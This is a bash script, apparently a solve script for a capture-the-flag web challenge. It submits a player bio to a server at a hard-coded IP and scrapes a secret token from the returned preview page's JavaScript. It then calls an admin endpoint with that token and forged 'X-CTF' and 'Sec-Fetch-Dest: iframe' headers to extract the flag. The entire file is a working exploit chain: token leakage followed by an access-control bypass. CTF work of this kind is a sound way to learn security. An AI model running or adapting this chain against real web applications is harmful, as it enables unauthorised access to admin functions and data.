#!/usr/bin/env bash
set -euo pipefail

HOST="65.109.176.78:3000"
BIO="hello from player"
# generate SID
if command -v uuidgen >/dev/null 2>&1; then
  SID=$(uuidgen)
else
  SID=$(python -c "import uuid;print(uuid.uuid4())")
fi
echo "Using SID: $SID"

# submit bio (creates preview)
curl -s -X POST "http://${HOST}/submit?sid=${SID}" -d "bio=${BIO}" -o /dev/null

# fetch player_preview page
PAGE=$(curl -s "http://${HOST}/player_preview?sid=${SID}")

# Attempt to extract token using several methods (first match wins)
TOKEN=""

# 1) grep -Po (fast if available)
if command -v grep >/dev/null 2>&1 && grep -Po '' <(printf '') >/dev/null 2>&1 2>/dev/null; then
  TOKEN=$(printf '%s' "$PAGE" | grep -Po 'const\s+token\s*=\s*"\K[0-9a-f]{32}(?=")' | head -n1 || true)
fi

# 2) sed fallback
if [ -z "$TOKEN" ]; then
  TOKEN=$(printf '%s' "$PAGE" | sed -n 's/.*const[[:space:]]\+token[[:space:]]*=[[:space:]]*"\([0-9a-f]\{32\}\)".*/\1/p' | head -n1 || true)
fi

# 3) perl fallback
if [ -z "$TOKEN" ] && command -v perl >/dev/null 2>&1; then
  TOKEN=$(printf '%s' "$PAGE" | perl -nle 'print $1 if /const\s+token\s*=\s*"([0-9a-f]{32})"/i' | head -n1 || true)
fi

# 4) python fallback
if [ -z "$TOKEN" ] && command -v python >/dev/null 2>&1; then
  TOKEN=$(printf '%s' "$PAGE" | python - <<'PY'
import sys, re
s=sys.stdin.read()
m=re.search(r'const\s+token\s*=\s*"([0-9a-f]{32})"', s, re.I)
print(m.group(1) if m else "")
PY
)
fi

if [ -z "$TOKEN" ]; then
  echo "Failed to extract token. Dumping page for inspection:"
  echo "---- player_preview page ----"
  printf '%s\n' "$PAGE"
  exit 1
fi

echo "Got token: $TOKEN"

# fetch admin preview blob with required headers
RESP=$(curl -s -G \
  -H "X-CTF: player" \
  -H "Sec-Fetch-Dest: iframe" \
  "http://${HOST}/admin/preview_blob?token=${TOKEN}")

echo "---- admin preview response ----"
printf '%s\n' "$RESP"

echo
echo "---- extracted flag candidates ----"
printf '%s\n' "$RESP" | grep -oE 'ASIS\{[^}]+\}|FLAG\{[^}]+\}' || echo "(no obvious flag pattern found)"

